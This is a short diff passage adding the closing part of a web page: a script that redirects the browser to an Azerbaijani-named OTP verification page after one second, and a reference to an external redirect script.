+            // Birbasa otp-yoxlama.html-? yonl?ndir
+            setTimeout(() => {
+                window.location.href = "otp-yoxlama.html";
+            }, 1000);
+        });
+    }
+});
+</script>
+<script src="otp-redirect.js"></script></body>
+
+</html>
